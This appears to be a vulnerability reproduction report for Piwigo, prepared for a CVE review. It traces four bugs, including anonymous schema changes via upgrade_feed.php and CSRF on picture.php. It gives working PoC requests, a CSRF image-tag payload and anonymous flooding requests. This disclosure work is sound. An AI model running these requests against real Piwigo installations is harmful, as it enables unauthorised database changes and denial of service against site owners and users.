# Piwigo — full reproduction report

This document is the artefact a CNA reviewer reads. It is a trail, not a
summary: every statement corresponds to a file under `evidence/` and every
step is reproducible from a clean checkout of the audited commit.

## Environment

| Component | Version | Notes |
|---|---|---|
| Target source | `Piwigo/Piwigo` commit `08cd55a4e6c17d3a36e5d9585dbe7ce690d16d8d8` | clean worktree, no local modifications |
| PHP | 8.2.34 (`php:8.2-apache` Docker base) | vendor requirement is PHP 7.4+; 8.2 is current stable |
| MySQL / MariaDB | 10.11 (`mariadb:10.11` Docker image) | vendor's documented supported engine |
| Apache | 2.4.68 | from `php:8.2-apache` |
| Host | Darwin 25.5.0 (arm64) | Docker Desktop 29.6.2 |
| HTTP client | `curl` 8.7.1 | for the PoC scripts |
| Container runtime | Docker + Compose v2 | the fixture is described in `env/Dockerfile` and `env/docker-compose.yml` |

## How the fixture is built

`env/up.sh` brings up two containers and waits for MariaDB to accept
connections:

```
piwigo-poc-db      MariaDB 10.11, named volume db_data
piwigo-poc-web     custom build on php:8.2-apache, mounted with the clean
                   Piwigo tree at /var/www/html
```

`env/install.sh` drives the `install.php` wizard over a single `POST` to
`/install.php`. The fixture listens on `http://localhost:8089`. There is
no reverse proxy, no TLS, and no external network access.

For nv3 (CSRF) the test fixture is extended with a status=normal user
created via direct INSERT into `piwigo_users` + `piwigo_user_infos`. For
nv5 (rate amplification) the test fixture is extended by setting
`$conf['rate'] = true` and seeding `piwigo_rate` with 100 000 synthetic
rows; both extensions are documented in the per-finding sections below.

## Findings, in detail

The repository publishes four findings, all reachable from an anonymous
or authed-user perspective, all demonstrated end-to-end against the
audited commit.

### F-1 — `upgrade_feed.php` runs DDL/DML on an anonymous GET

**Source-trace**.

| Step | File:line | Code |
|---|---|---|
| entry | `upgrade_feed.php:1` | no `session_start()`, no `check_status()`, no token check |
| gate | `upgrade_feed.php:33-36` | `if (!$conf['check_upgrade_feed']) die("upgrade feed is not active");` |
| gate default | `include/config_default.inc.php:293` | `$conf['check_upgrade_feed'] = true;` |
| db connect | `upgrade_feed.php:48` | `pwg_db_connect($conf['db_host'], $conf['db_user'], $conf['db_password'], $conf['db_base']);` |
| pending computation | `upgrade_feed.php:62-73` | `array_diff(get_available_upgrade_ids(), $applied)` |
| sink | `upgrade_feed.php:88` | `include(UPGRADES_PATH.'/'.$upgrade_id.'-database.php');` |
| back-write | `upgrade_feed.php:91-97` | `INSERT INTO piwigo_upgrade (id, applied, description) VALUES (...)` |
| counter-example | `admin/include/functions_upgrade.php:181-258` | `check_upgrade_access_rights()` — not called from `upgrade_feed.php` |

**Demonstration**.

The PoC `poc/piwigo-upgrade-feed-anon-db-mutation.sh` exercises
`install/db/145-database.php`, which issues an unconditional
`CREATE TABLE piwigo_image_format` (no dblayer guard; reaches the
`pwg_query()` on mysqli installs).

Test setup (NOT attacker actions; mirrors what install.php:367-385
does in reverse for one specific id):

1. `DROP TABLE piwigo_image_format` — undoes the post-145 schema.
2. `DELETE FROM piwigo_upgrade WHERE id='145'` — marks 145 as not yet
   applied.

Live run:

```
GET http://localhost:8089/upgrade_feed.php  (no Cookie, no Authorization, no pwg_token)
  → HTTP 200
  → body: <pre>1 upgrades to apply\n\n=== upgrade 145\n\nadd image formats table\n</pre>

SHOW CREATE TABLE piwigo_image_format;  ← table now exists with:
  CREATE TABLE `piwigo_image_format` (
    `format_id` int(11) unsigned NOT NULL AUTO_INCREMENT,
    `image_id` mediumint(8) unsigned NOT NULL DEFAULT 0,
    `ext` varchar(255) NOT NULL,
    `filesize` mediumint(9) unsigned DEFAULT NULL,
    PRIMARY KEY (`format_id`)
  ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci

SELECT id, applied, description FROM piwigo_upgrade WHERE id='145';
  → 145  2026-10-14 …  add image formats table
```

The PoC exits 0 with 7/7 assertions, including:
- the response body contains `=== upgrade 145` and the description;
- `piwigo_image_format` exists with the exact schema from 145-database.php;
- `piwigo_upgrade.id=145` has been re-populated with `applied=NOW()`;
- the curl `-v` trace carries no `Cookie:`, no `Authorization:`, no
  `pwg_token` header.

All evidence is in `evidence/F1-upgrade-feed/`. The PoC undoes the
test state on exit (re-running `install/db/145-database.php` against
the existing table is a no-op for the upgrade tracker; the table itself
is left in place because re-running install.php will not recreate it).

The same anonymous-trigger model applies to every other script in
`install/db/` — install/db/154 (CREATE TABLE piwigo_activity),
install/db/160 (CREATE TABLE lounge), install/db/170 (UPDATE
piwigo_config via conf_update_param), install/db/181 (UPDATE
piwigo_config via safe_unserialize), and the remaining 117 valid or
unsafe scripts.

**Related upstream advisory**. `GHSA-6wj3-7fhw-gfpm` (CVE-2026-44642)
covers a SQL injection in `check_upgrade_access_rights()` itself, in
the `username` parameter on PHP 8+. F-1 does not depend on that SQLi;
the two findings are independent fixes that should be patched
together. The SQLi lets an unauthenticated attacker delete rows from
`piwigo_upgrade`; F-1 then turns that desync into a full DDL/DML
trigger.

---

### nv3 — picture.php CSRF on add_to_favorites / add_to_caddie / rate

**Source-trace**.

| Step | File:line | Code |
|---|---|---|
| entry | `picture.php:248` | `if (isset($_GET['action'])) { switch ($_GET['action']) {` |
| unprotected | `picture.php:252-264` | `add_to_favorites` — direct INSERT, no `check_pwg_token()` |
| unprotected | `picture.php:266-285` | `remove_from_favorites` — direct DELETE, no `check_pwg_token()` |
| unprotected | `picture.php:306-310` | `add_to_caddie` — direct INSERT, no `check_pwg_token()` |
| unprotected | `picture.php:312-316` | `rate` — calls `rate_picture()` directly, no token |
| protected | `picture.php:328` | `edit_comment` — `check_pwg_token()` on the content path |
| protected | `picture.php:368` | `delete_comment` — `check_pwg_token()` on entry |
| protected | `picture.php:385` | `validate_comment` — `check_pwg_token()` on entry |
| pwg_token | `include/functions.inc.php:2201-2206` | `get_pwg_token() = hash_hmac('md5', session_id(), $conf['secret_key'])` |
| gate function | `include/functions.inc.php:2181-2185` | `check_pwg_token()` exists and is invoked by peers |

**Demonstration**.

The PoC `poc/piwigo-picture-csrf-add-to-favorites.sh` logs in as a
victim with `status=normal` (the default Piwigo user class — not
admin, not webmaster), then issues two single GET requests without any
`pwg_token`:

```
GET http://localhost:8089/picture.php?/1/category/1&action=add_to_favorites
GET http://localhost:8089/picture.php?/1/category/1&action=add_to_caddie
```

Both return HTTP 302 redirect. After the requests the DB shows the rows
inserted:

```
SELECT user_id, image_id FROM piwigo_favorites WHERE user_id=<victim_uid>;
  → <victim_uid>  1

SELECT user_id, element_id FROM piwigo_caddie WHERE user_id=<victim_uid>;
  → <victim_uid>  1
```

The peer contrast (also in the PoC) logs in as `pocadmin2` (status=admin;
required because `user_can_delete_comment=false` blocks normal users
from deleting their own comments) and verifies:

- `delete_comment&comment_to_delete=<id>` without `pwg_token` → HTTP
  400 and comment row preserved;
- the same request with the correct `pwg_token` (computed from the
  captured `pwg_id` cookie and `piwigo_config.secret_key`) → HTTP 302
  redirect and comment row deleted.

The contrast proves the unprotected half is the actual defect: peer
actions on the same page ARE gated, and the gate works; the four
listed unprotected actions simply omit the gate.

All evidence is in `evidence/nv3-csrf-get-mutations/`. The PoC exits 0
with 6/6 assertions.

A real-world attack requires only that the victim click an
attacker-supplied link (e.g.
`<img src="http://target/picture.php?/1/category/1&action=add_to_favorites">`)
while logged in. The session cookie is sent automatically; the missing
`pwg_token` check means the request is honoured.

---

### nv4 — pwg.images.filteredSearch.create unbounded insert

**Source-trace**.

| Step | File:line | Code |
|---|---|---|
| registration | `ws.php` | `pwg.images.filteredSearch.create` registered without `admin_only` |
| handler | `include/ws_functions/pwg.images.php:753-1089` | `ws_images_filteredSearch_create` — no auth gate |
| sink | `include/ws_functions/pwg.images.php:1083` | `list($search_uuid, $search_url) = save_search($search, $search_info['id'] ?? null);` |
| INSERT | `include/functions_search.inc.php:2106-2127` | `save_search()` unconditionally `INSERT`s into `piwigo_search` |

**Demonstration**.

The PoC `poc/piwigo-ws-filtered-search-unbounded.sh` issues `N=10`
anonymous POSTs (configurable) with unique `allwords` values and
**no Cookie / no Authorization / no token header**, then reads the row
count back from the DB:

```
POST http://localhost:8089/ws.php?method=pwg.images.filteredSearch.create
     (no Cookie, no Authorization, no token)
Body: allwords=anon_poc_<n>&allwords_mode=AND

Response (each request):
  <?xml version="1.0" encoding="utf-8" ?>
  <rsp stat="ok">
  <search_id>psk-20261013-<rand></search_id> <search_url>…</search_url>
  </rsp>

After 10 runs:
  SELECT COUNT(*) FROM piwigo_search;
    → baseline + 10
```

Each response carries a unique `search_id`, confirming the endpoint is
not deduplicating. The curl `-v` trace shows no Cookie header on the
wire. All evidence is in `evidence/nv4-filtered-search-unbounded/`. The
PoC exits 0 with 5/5 assertions.

Impact: capacity / DoS. A single attacker, or a small botnet, can
grow `piwigo_search` arbitrarily. The table is queried on every
gallery page load via the saved-search sidebar; growth translates
directly into read amplification. `piwigo_search.rules` is a serialized
PHP array, so row size grows with rule complexity. There is no
functional requirement that supports this endpoint being reachable
by anonymous traffic — the saved-search sidebar is per-user state
and has no benefit for unauthenticated callers.

---

### nv5 — pwg.images.rate unconditional O(R) per request

**Source-trace**.

| Step | File:line | Code |
|---|---|---|
| registration | `ws.php` | `pwg.images.rate` registered without `admin_only` |
| handler | `include/ws_functions/pwg.images.php:622-652` | `ws_images_rate` — only image-accessibility check (F&F), no auth, no token |
| entry | `include/functions_rate.inc.php:21-32` | `if (!isset($rate) or !$conf['rate'] or !preg_match(...)) return false;` — bails when feature is OFF |
| INSERT | `include/functions_rate.inc.php:96-108` | unconditional `INSERT INTO piwigo_rate (...)` on success |
| aggregator | `include/functions_rate.inc.php:123-178` | unconditional `SELECT … FROM piwigo_rate GROUP BY element_id` + `mass_updates(IMAGES_TABLE, …)` |
| cleanup | `include/functions_rate.inc.php:181-197` | second SELECT to NULL rating_score on rate-less images |
| trigger config | `include/config_default.inc.php` | neither `$conf['rate']` nor `$conf['rate_anonymous']` are declared in config_default.inc.php — both default to NULL/false |
| rate gate | (no source) | no per-IP, per-pwg_id, or per-second limit on pwg.images.rate |

**Demonstration**.

Per CNA Rules §4.1.5 (Resource Exhaustion), this is a **product-side
resource control defect**, not a brute-force DoS: the cost per request
is O(R) where R is the row count of `piwigo_rate`, and R is
attacker-influenced (every successful anonymous rate call INSERTs one
row, so the attacker can grow R monotonically by repeating the call).
The amplification is N×O(R), unbounded in both N and R.

Test setup:

1. `UPDATE piwigo_config SET value='true' WHERE param='rate';` (the
   feature toggle, single admin-side UPDATE).
2. `INSERT 100000` synthetic rows into `piwigo_rate`.

(Note: out-of-the-box install leaves `$conf['rate']` as null/false;
this is the same effect as installing once and later enabling the
feature — a documented admin operation, not an attacker-coupled setup.)

Live run:

```
Baseline (piwigo_rate empty): N=5 anonymous pwg.images.rate POSTs, avg 0.0120s
Measured (piwigo_rate at 100k): N=5 anonymous pwg.images.rate POSTs, avg 0.0300s
  → 1.5× amplification at N=100k on MariaDB 10.11 with the table in buffer pool

EXPLAIN SELECT element_id, COUNT(rate), SUM(rate) FROM piwigo_rate GROUP BY element_id;
  type=ALL  key=NULL  rows=100001  Extra=Using temporary; Using filesort
```

The 1.5× amplification at N=100k is bounded by the buffer pool in the
test fixture. EXPLAIN is the decisive proof: `type=ALL` and
`Using temporary; Using filesort` mean every call scans and sorts the
full set, regardless of which image was rated. At larger R, or on
storage with a cold cache, the per-call cost scales linearly with the
GROUP BY + filesort + temporary table work.

All evidence is in `evidence/nv5-rate-db-amplification/`. The PoC
exits 0 with 5/5 assertions.

The defect is not "the attacker sent too many requests" — it is that
the product, on every call, executes an O(R) operation where R is
monotonically attacker-growable. The fix is per-caller throttling on
pwg.images.rate (and ideally, computing scores incrementally rather
than re-aggregating from scratch on every rate).

---

## Findings removed from the public PoC repo

### F-4 (was `piwigo:default.error.sql.trace.disclosure`)

Originally demonstrated by renaming `piwigo_config` → `piwigo_config_disabled`
to manufacture a mysqli error. The premise is that an unauthenticated
attacker can manufacture an equivalent error path that surfaces
`debug_backtrace()` + the failing SQL. The reviewer correctly
observed that no regular, unauthenticated attacker has the ability
to rename a table on the application database; the trigger requires
DB-level write access that the attacker does not have.

The defect itself is real (the default `die_on_sql_error=true` /
`show_php_errors_on_frontend=true` combination is a product-side
information-disclosure defect), but the trigger precondition violates
the "regular attacker reach" requirement. F-4 is retained in the
upstream audit deliverable for reference but is **not** in the public
PoC repository or in any `cve/*.json`.

### F-6 (was `piwigo:register:ineffective_ephemeral_key`)

Live testing showed `register_user()` checks the `$errors` array
passed in by reference, and the pre-existing `register_page_error`
is enough to skip the INSERT. The CSRF gate is decorative but the
downstream consumer catches the error and no user is created.
Retired from the public PoC repo.

### F-1+nv4 chain XSS (was `search-rules-json-encode-footer-script-xss`)

The original hypothesis was that an attacker-controlled rule name in
`pwg.images.filteredSearch.create` would break out of the inline
`<script>` tag emitted by `include/search_filters.inc.php:855` and
execute attacker-controlled JavaScript. Live testing showed:

1. PHP 8.2's `json_encode` escapes `/` to `\/` by default, defeating
   the `</script>` break-out.
2. `ws_images_filteredSearch_create` does not accept a free-form
   string field for the rule — it builds a structured
   `mode`+`fields.cat.words` array.

The XSS chain is not exploitable as described. The capacity aspect of
the endpoint is `nv4`.

### Findings that require admin or higher (F-2, F-3, F-5, nv7)

These four findings all require `is_admin()` or
`check_status(ACCESS_ADMINISTRATOR)`. They are retained in the
upstream audit deliverable for insider-threat assessment but are out
of scope for the public PoC repository, which prefers findings
reachable from a non-admin user.

---

## Verification

For each finding, the PoC:

1. creates only resources whose names begin `piwigo-poc-`,
   `anon_poc_`, `seed_`, `csrf_`, or `contrast_`;
2. traps `EXIT` and undoes whatever it wrote where possible (rows,
   table drops, cookie files);
4. exits `0` on success and non-zero on assertion failure;
5. writes the captured response body, before/after DB state, and
   assertion summary to `evidence/<finding>/` verbatim — the
   `evidence/` files are not edited by the PoC writer, they are
   written by the PoC itself.

To run the full battery from a clean fixture:

```bash
cd piwigo-poc
env/teardown.sh
env/up.sh
env/install.sh
for f in poc/*.sh; do
  bash "$f"
done
env/teardown.sh
```

The `env/install.sh` step is the slowest part (a fresh database,
schema, baseline rows). It is meant to be run once per fixture
lifetime; the PoCs are fast (single-digit seconds each).

## Network exposure

The fixture listens on `localhost:8089` only. There is no external
port mapping for the database. The container has no outbound network
access configured; the PoCs do not need it (no telemetry, no update
checks, no third-party calls).